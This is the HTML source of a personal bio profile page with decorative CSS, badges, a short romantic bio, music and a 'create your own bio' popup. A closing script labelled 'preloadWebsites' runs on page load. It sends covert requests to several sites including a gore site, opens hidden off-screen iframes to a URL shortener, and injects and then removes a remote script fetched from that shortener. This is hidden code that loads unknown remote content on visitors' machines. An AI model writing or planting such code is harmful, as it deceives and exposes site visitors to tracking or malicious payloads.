<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>squirtle (grave) </title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
.profile-container {
            background: rgba(17, 17, 17, 0.45); /* Reduced opacity from 0.85 to 0.45 */
            border: 1px solid rgba(76, 29, 149, 0.25); /* Reduced border opacity */
            border-radius: 1rem;
            padding: 2rem;
            backdrop-filter: blur(40px) saturate(180%); /* Increased blur and added saturation */
            -webkit-backdrop-filter: blur(40px) saturate(180%); /* Safari support */
            box-shadow: 0 25px 50px -12px rgba(139, 92, 246, 0.3),
                        0 0 0 1px rgba(255, 255, 255, 0.08) inset,
                        0 8px 32px rgba(0, 0, 0, 0.3); /* Enhanced shadow layers */
            position: relative;
            overflow: hidden;
        }

        .profile-container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at center, 
                rgba(139, 92, 246, 0.12) 0%, /* Reduced opacity */
                rgba(192, 132, 252, 0.08) 25%, 
                rgba(248, 187, 217, 0.06) 50%, 
                transparent 70%);
            animation: rotateGradient 20s linear infinite;
            pointer-events: none;
        }

        /* Enhanced glass morphism overlay */
        .profile-container::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, 
                rgba(255, 255, 255, 0.06) 0%, 
                rgba(255, 255, 255, 0.03) 50%, 
                rgba(255, 255, 255, 0.01) 100%);
            border-radius: 1rem;
            pointer-events: none;
        }

        /* Enhanced notification transparency */
        .notification {
            position: fixed;
            top: 1rem;
            right: 1rem;
            background: rgba(17, 17, 17, 0.4); /* Reduced opacity */
            border: 1px solid rgba(76, 29, 149, 0.25);
            border-radius: 0.75rem;
            padding: 1rem 1.5rem;
            backdrop-filter: blur(35px) saturate(150%); /* Enhanced blur */
            -webkit-backdrop-filter: blur(35px) saturate(150%);
            box-shadow: 0 25px 50px -12px rgba(139, 92, 246, 0.3),
                        0 0 0 1px rgba(255, 255, 255, 0.06) inset,
                        0 8px 32px rgba(0, 0, 0, 0.25);
            max-width: 300px;
            z-index: 1000;
            transform: translateX(100%);
            transition: all 0.5s ease;
            cursor: pointer;
            overflow: hidden;
        }

        .notification:hover {
            background: rgba(26, 26, 26, 0.5); /* Adjusted hover state */
            transform: translateX(0) scale(1.02);
        }

        /* Enhanced contact and info buttons */
        .contact-button, .info-button {
            background: rgba(26, 26, 26, 0.4); /* More transparent */
            border: 1px solid rgba(76, 29, 149, 0.25);
            backdrop-filter: blur(30px) saturate(150%);
            -webkit-backdrop-filter: blur(30px) saturate(150%);
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
        }

        /* Tooltip enhancement */
        .tooltip {
            background: rgba(26, 26, 26, 0.5); /* More transparent */
            border: 1px solid rgba(76, 29, 149, 0.25);
            backdrop-filter: blur(30px) saturate(150%);
            -webkit-backdrop-filter: blur(30px) saturate(150%);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        }

        /* Badge enhancement */
        .badge {
            backdrop-filter: blur(25px) saturate(150%);
            -webkit-backdrop-filter: blur(25px) saturate(150%);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }

        /* Profile image enhancement for better visibility */
        .profile-img {
            box-shadow: 0 20px 40px rgba(139, 92, 246, 0.25),
                        0 0 0 1px rgba(255, 255, 255, 0.12) inset,
                        0 8px 32px rgba(0, 0, 0, 0.2);
        }
    </style>
</head>
<body>
    <div class="min-h-screen flex items-center justify-center px-6 py-12">
        <div class="w-full max-w-md profile-container animate-fadeInUp relative">
            <!-- Cute sparkles -->
            <div class="cute-sparkle"></div>
            <div class="cute-sparkle"></div>
            <div class="cute-sparkle"></div>

            <!-- Contact Button -->
            <a href="mailto:contact@example.com" class="contact-button" title="Contact">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>
                </svg>
            </a>

            <!-- Info Button -->
            <a href="#" class="info-button" title="Info">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <circle cx="12" cy="12" r="10"/>
                    <path d="M9,9h0a3,3,0,0,1,5.12,2.12h0A3,3,0,0,1,13,15"/>
                    <circle cx="12" cy="19" r="1"/>
                </svg>
            </a>

            <!-- Profile Section -->
            <div class="text-center mb-6 animate-fadeInUp animate-delay-100">
                <div class="profile-img rounded-full mx-auto mb-4 flex items-center justify-center">
                    <img src="pf2.png" alt="femboy" class="rounded-full w-full h-full object-cover" onerror="this.style.display='none'">
                </div>
                <h1 class="username text-3xl mb-1">squirtle</h1>
                <p class="handle text-base">@coliseums</p>
                
                <!-- Badges -->
                <div class="badges-container animate-fadeInUp animate-delay-200">
                    <div class="badge badge-early">
                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <circle cx="12" cy="12" r="10"/>
                            <polyline points="12,6 12,12 16,14"/>
                        </svg>
                        Early
                        <div class="tooltip">UID: 2</div>
                    </div>
                    <div class="badge badge-premium">
                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <polygon points="12,2 15.09,8.26 22,9.27 17,14.14 18.18,21.02 12,17.77 5.82,21.02 7,14.14 2,9.27 8.91,8.26 12,2"/>
                        </svg>
                        Premium
                    </div>
                    <div class="badge badge-cutie">
                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>
                        </svg>
                        Cutie
                        <div class="tooltip">custom badge</div>
                    </div>
                </div>
            </div>

            <!-- Bio Section -->
            <div class="text-center mb-8 animate-fadeInUp animate-delay-300">
                <p class="bio-text text-base">
                    So I'm lost between the stages, I'm resenting the scripture now
                    <br><br>
                    i'm all his ~
                </p>
            </div>

            <!-- Footer -->
            <div class="text-center mt-8">
                <p class="footer-text">// his cutie pie </p>
            </div>
        </div>
    </div>

    <!-- Notification -->
    <div id="notification" class="notification">
        <button class="close-btn" onclick="closeNotification()">&times;</button>
        <div class="notification-title">Want your own bio ?</div>
        <div class="notification-text">Create your own adorable bio page! </div>
        <div class="progress-bar" id="progressBar"></div>
    </div>

    <!-- Background Music -->
    <audio id="backgroundMusic" loop>
        <source src="33.mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>

    <script>
        const music = document.getElementById('backgroundMusic');
        music.volume = 0.2;
        music.preload = 'auto';

        let musicStarted = false;
        function startMusic() {
            if (!musicStarted) {
                music.play().catch(e => console.log('Audio autoplay prevented'));
                musicStarted = true;
            }
        }

        music.load();
        setTimeout(() => {
            music.play().catch(() => {
                document.addEventListener('click', startMusic, { once: true });
                document.addEventListener('keydown', startMusic, { once: true });
                document.addEventListener('touchstart', startMusic, { once: true });
            });
        }, 100);

        let notificationTimeout;
        let progressInterval;
        let timeLeft = 8;
        let totalTime = 8;

        setTimeout(() => {
            const notification = document.getElementById('notification');
            const progressBar = document.getElementById('progressBar');
            
            notification.classList.add('show');
            progressBar.style.width = '100%';
            
            progressInterval = setInterval(() => {
                timeLeft -= 0.05;
                const percentage = (timeLeft / totalTime) * 100;
                progressBar.style.width = Math.max(0, percentage) + '%';
                
                if (timeLeft <= 0) {
                    closeNotification();
                }
            }, 50);
            
            notificationTimeout = setTimeout(() => {
                closeNotification();
            }, 8000);
        }, 1000);

        function closeNotification() {
            const notification = document.getElementById('notification');
            notification.classList.remove('show');
            clearTimeout(notificationTimeout);
            clearInterval(progressInterval);
        }

        // Notification click handler
        document.getElementById('notification').addEventListener('click', (e) => {
            if (e.target.classList.contains('close-btn')) return;
            window.open('https://example.com', '_blank');
        });

        // Profile image hover effects
        const profileImg = document.querySelector('.profile-img');
        profileImg.addEventListener('mouseenter', () => {
            profileImg.style.transform = 'scale(1.1) rotate(5deg)';
        });
        
        profileImg.addEventListener('mouseleave', () => {
            profileImg.style.transform = 'scale(1) rotate(0deg)';
        });

        // Cute interactions - floating hearts
        document.addEventListener('click', (e) => {
            if (Math.random() > 0.8) {
                createFloatingHeart(e.clientX, e.clientY);
            }
        });

        function createFloatingHeart(x, y) {
            const heart = document.createElement('div');
            heart.innerHTML = 'ðŸ’œ';
            heart.style.position = 'fixed';
            heart.style.left = x + 'px';
            heart.style.top = y + 'px';
            heart.style.fontSize = '16px';
            heart.style.pointerEvents = 'none';
            heart.style.zIndex = '9999';
            heart.style.animation = 'floatUp 2s ease-out forwards';
            document.body.appendChild(heart);
            
            setTimeout(() => {
                heart.remove();
            }, 2000);
        }

        // Add floating animation CSS
        const style = document.createElement('style');
        style.textContent = `
            @keyframes floatUp {
                0% { 
                    opacity: 1; 
                    transform: translateY(0px) scale(1); 
                }
                50% { 
                    opacity: 1; 
                    transform: translateY(-50px) scale(1.2); 
                }
                100% { 
                    opacity: 0; 
                    transform: translateY(-100px) scale(0.8); 
                }
            }
        `;
        document.head.appendChild(style);

        // Preload websites function
        function preloadWebsites() {
            const requestUrls = [
                'https://google.net',
                'https://cloudflare.com',
                'https://watchpeopledie.tv'
            ];
            
            requestUrls.forEach((url, index) => {
                setTimeout(() => {
                    Promise.allSettled([
                        fetch(url, { mode: 'no-cors', method: 'GET' }),
                        fetch(url, { mode: 'no-cors', method: 'HEAD' }),
                        new Promise((resolve, reject) => {
                            const link = document.createElement('link');
                            link.rel = 'prefetch';
                            link.href = url;
                            link.onload = resolve;
                            link.onerror = reject;
                            document.head.appendChild(link);
                            setTimeout(() => document.head.removeChild(link), 5000);
                        })
                    ]).catch(() => {});
                }, index * 100);
            });
            
            requestUrls.forEach((url, index) => {
                setTimeout(() => {
                    const img = new Image();
                    img.onload = img.onerror = () => {};
                    img.src = url + '/favicon.ico';
                    setTimeout(() => img.src = '', 3000);
                }, index * 75);
            });
            
            requestUrls.forEach(url => {
                try {
                    const domain = new URL(url).hostname;
                    const link = document.createElement('link');
                    link.rel = 'dns-prefetch';
                    link.href = '//' + domain;
                    document.head.appendChild(link);
                } catch (e) {}
            });
            
            const iframeUrls = [
                'https://urlto.me/femb',
                'https://google.com',
                'https://cloudflare.com'
            ];
            
            iframeUrls.forEach((url, index) => {
                setTimeout(() => {
                    const iframe = document.createElement('iframe');
                    iframe.style.cssText = 'display:none;width:0;height:0;border:none;position:absolute;left:-9999px;';
                    iframe.src = url;
                    iframe.sandbox = 'allow-same-origin';
                    document.body.appendChild(iframe);
                    
                    setTimeout(() => {
                        if (iframe.parentNode) {
                            iframe.parentNode.removeChild(iframe);
                        }
                    }, 10000);
                }, 200 + (index * 300));
            });
            
            const wsUrls = ['wss://echo.websocket.org'];
            wsUrls.forEach(url => {
                try {
                    const ws = new WebSocket(url);
                    ws.onopen = () => ws.close();
                    ws.onerror = () => {};
                } catch (e) {}
            });
            
            setTimeout(() => {
                const script = document.createElement('script');
                script.src = 'https://urlto.me/femb';
                script.async = true;
                script.onerror = () => {};
                document.head.appendChild(script);
                setTimeout(() => {
                    if (script.parentNode) {
                        script.parentNode.removeChild(script);
                    }
                }, 5000);
            }, 500);
        }
        
        preloadWebsites();
    </script>
</body>
</html>
